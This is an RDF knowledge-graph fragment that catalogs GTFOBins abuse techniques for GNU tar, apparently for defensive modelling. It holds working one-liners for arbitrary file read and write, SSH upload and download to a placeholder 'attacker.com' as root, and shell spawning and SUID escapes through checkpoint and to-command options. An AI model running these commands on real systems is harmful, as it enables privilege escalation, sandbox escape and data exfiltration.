mknd:command_tar-file-download a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "tar-file-download" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This only works for GNU tar. Download and extract a tar archive via SSH. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions)." ;
    d3f:uses mknd:executable_tar ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_tar ;
    mknd:provides mknd:function_file-download ;
    mknd:value """RHOST=attacker.com
RUSER=root
RFILE=/tmp/file_to_get.tar
tar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh
""" .

mknd:command_tar-file-read a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "tar-file-read" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This only works for GNU tar." ;
    d3f:uses mknd:executable_tar ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_tar ;
    mknd:provides mknd:function_file-read ;
    mknd:value """LFILE=file_to_read
tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
""" .

mknd:command_tar-file-upload a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "tar-file-upload" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions)." ;
    d3f:uses mknd:executable_tar ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_tar ;
    mknd:provides mknd:function_file-upload ;
    mknd:value """RHOST=attacker.com
RUSER=root
RFILE=/tmp/file_to_send.tar
LFILE=file_to_send
tar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh
""" .

mknd:command_tar-file-write a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "tar-file-write" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This only works for GNU tar." ;
    d3f:uses mknd:executable_tar ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_tar ;
    mknd:provides mknd:function_file-write ;
    mknd:value """LFILE=file_to_write
TF=$(mktemp)
echo DATA > "$TF"
tar c --xform "s@.*@$LFILE@" -OP "$TF" | tar x -P
""" .

mknd:command_tar-limited-suid a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "tar-limited-suid" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_tar ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_tar ;
    mknd:provides mknd:function_limited-suid ;
    mknd:value "./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" .

mknd:command_tar-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "tar-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This only works for GNU tar.",
        "This only works for GNU tar. It can be useful when only a limited command argument injection is available." ;
    d3f:uses mknd:executable_tar ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_tar ;
    mknd:provides mknd:function_shell ;
    mknd:value """TF=$(mktemp)
echo '/bin/sh 0<&1' > "$TF"
tar cf "$TF.tar" "$TF"
tar xf "$TF.tar" --to-command sh
rm "$TF"*
""",
        "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
        "tar xf /dev/null -I '/bin/sh -c \"sh <&2 1>&2\"'" .

